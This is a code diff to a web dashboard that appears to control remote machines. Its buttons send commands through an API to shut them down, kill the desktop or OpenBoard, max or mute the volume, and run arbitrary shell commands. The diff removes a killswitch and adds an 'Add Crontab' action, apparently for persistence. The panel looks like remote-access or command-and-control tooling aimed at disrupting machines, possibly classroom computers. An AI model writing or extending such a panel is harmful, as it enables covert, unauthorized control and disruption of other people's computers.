@@ -13,7 +13,7 @@
       width: 80%;
       margin: 20px auto;
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+      grid-template-columns: repeat(auto-fit, minmax(600px, 1fr));
       gap: 20px;
     }
     .server-card {
@@ -177,6 +177,10 @@
             <span class="info-label">Connection:</span>
             <span class="info-value">${server.conn}</span>
           </div>
+          <div class="info-row">
+            <span class="info-label">CName:</span>
+            <span class="info-value">${server.canonicalName}</span>
+          </div>
           <div class="button-container">
             <div class="button-container">
               <input type="text" id="firstexecdelay" name="firstexecdelay" value="First execution delay (1s)">
@@ -186,13 +190,13 @@
               <div class="dropdown">
                 <button class="button dropdown-button">Actions</button>
                 <div class="dropdown-content">
-                  <button onclick="handleAction(${serverId}, 'killswitch')">Killswitch</button>
                   <button onclick="handleAction(${serverId}, 'shutdown')">Timed shutdown (instant)</button>
                   <button onclick="handleAction(${serverId}, 'killDesktop')">Kill Desktop V2</button>
                   <button onclick="handleAction(${serverId}, 'killOpenBoard')">Kill OpenBoard</button>
                   <button onclick="handleAction(${serverId}, 'killShit')">Kill Shit</button>
                   <button onclick="handleAction(${serverId}, 'VOLUPMAX')">Volume Up 100%</button>
                   <button onclick="handleAction(${serverId}, 'VOLUPMIN')">Volume Down 0%</button>
+                  <button onclick="handleAction(${serverId}, 'addCrontab')">Add Crontab</button>
                   <button onclick="openCommandModal(${serverId})">Shell Execution</button>
 
                 </div>
@@ -277,6 +281,10 @@
       }else if(action == 'killShit'){
         let xhr = new XMLHttpRequest();
         xhr.open('GET', `/api/querysender?imsi=${serverId}&cmd=ACTIONKILLSHIT|${fexecdelay}|${execdelays}|${repeats}`);
+        xhr.send();
+      }else if(action == 'addCrontab'){
+        let xhr = new XMLHttpRequest();
+        xhr.open('GET', `/api/querysender?imsi=${serverId}&cmd=ACTIONADDCRON|${fexecdelay}|${execdelays}|${repeats}`);
         xhr.send();
       }
       else if(action == 'killswitch'){
